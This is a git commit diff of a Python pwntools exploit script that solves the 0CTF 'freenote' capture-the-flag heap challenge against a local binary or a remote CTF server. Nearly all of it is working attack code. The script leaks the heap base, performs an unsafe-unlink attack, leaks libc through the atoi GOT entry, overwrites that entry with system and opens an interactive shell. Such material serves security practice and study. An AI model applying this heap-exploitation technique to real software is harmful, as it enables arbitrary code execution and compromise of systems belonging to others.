715599121f2b8bd95b84d78dbdc61cbb7db02b31
M4xW4n9 <aboultraman@gmail.com>
2018-02-21 20:38:24 +0800

    classical 2free

--- 0ctf_freenote/exp.py
+++ 0ctf_freenote/exp.py
@@ -12,43 +12,72 @@ if sys.argv[1] == "l":
     io = process("./freenote_x64")
     elf = ELF("./freenote_x64")
     libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
-
 else:
-    io = remote("localhost", 9999)
+    io = remote("pwn2.jarvisoj.com", 9886)
     elf = ELF("./freenote_x64")
-    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    libc = ELF("./libc-2.19.so")
 
-def DEBUG():
-    raw_input("DEBUG: ")
-    gdb.attach(io)
-
-def listNote():
+def listPost():
     io.sendlineafter("choice: ", "1")
     
-def newNote(length, content):
+def newPost(content):
     io.sendlineafter("choice: ", "2")
-    io.sendlineafter("note: ", str(length))
-    io.sendlineafter("note: ", content)
+    io.sendlineafter("note: ", str(len(content)))
+    io.sendafter("note: ", content)
 
-def editNote(idx, length, content):
+def editNote(idx, content):
     io.sendlineafter("choice: ", "3")
     io.sendlineafter("number: ", str(idx))
-    io.sendlineafter("note: ", str(length))
-    io.sendlineafter("note: ", content)
+    io.sendlineafter("note: ", str(len(content)))
+    io.sendafter("note: ", content)
 
-def delNote(idx):
+def delPost(idx):
     io.sendlineafter("choice: ", "4")
     io.sendlineafter("number: ", str(idx))
 
 if __name__ == "__main__":
-    newNote(0x80, cyclic(0x80))
-    newNote(0x80, cyclic(0x80))
-    delNote(0)
+    ptr = 0x6020A8
+    for i in xrange(5):
+        newPost(str(i) * 0x80)
 
-    newNote(8, "1234567")
-    DEBUG()
-    listNote()
-    libc_base = u64(io.recvuntil("\x7f")[-6: ].ljust(8, "\x00"))
-    info("libc_base -> 0x%x" % libc_base)
+    delPost(3)
+    delPost(1)
+
+    payload = '0' * 0x80 + 'a' * 0x10
+    editNote(0, payload)
+
+    success("Step 1: leak heapBase")
+    listPost()
+    io.recvuntil("a" * 0x10)
+    heapBase = u64(io.recvuntil("\x0a", drop = True).ljust(8, '\x00')) - 0x19d0 # 0x1810 + 3 * 0x90 + 0x10
+    info("heapBase -> 0x%x" % heapBase)
+    chunk0Addr = heapBase + 0x30
+    info("chunk0Addr -> 0x%x" % chunk0Addr)
+    pause()
+
+    success("Step 2: unlink")
+    payload = p64(0x90) + p64(0x80) + p64(chunk0Addr - 0x18) + p64(chunk0Addr - 0x10) + '0' * (0x80 - 8 * 4)
+    payload += p64(0x80) + p64(0x90 + 0x90) + '1' * 0x70
+    editNote(0, payload)
+    delPost(1)
+    #  pause()
+
+    success("Step 3: leak libcBase")
+    payload = p64(2) + p64(1) + p64(0x100) + p64(chunk0Addr - 0x18)
+    payload += p64(1) + p64(0x8) + p64(elf.got["atoi"])
+    payload = payload.ljust(0x100, '\x00')
+    editNote(0, payload)
+    listPost()
+    io.recvuntil("0. ")
+    io.recvuntil("1. ")
+    libcBace = u64(io.recvuntil("\x0a", drop = True).ljust(8, '\x00')) - libc.symbols["atoi"]
+    info("libcBace -> 0x%x" % libcBace)
+    systemAddr = libcBace + libc.symbols["system"]
+    pause()
+
+    success("Step 4: hijack & get shell")
+    editNote(1, p64(systemAddr))
+    io.sendlineafter("choice: ", "$0")
+
     io.interactive()
     io.close()
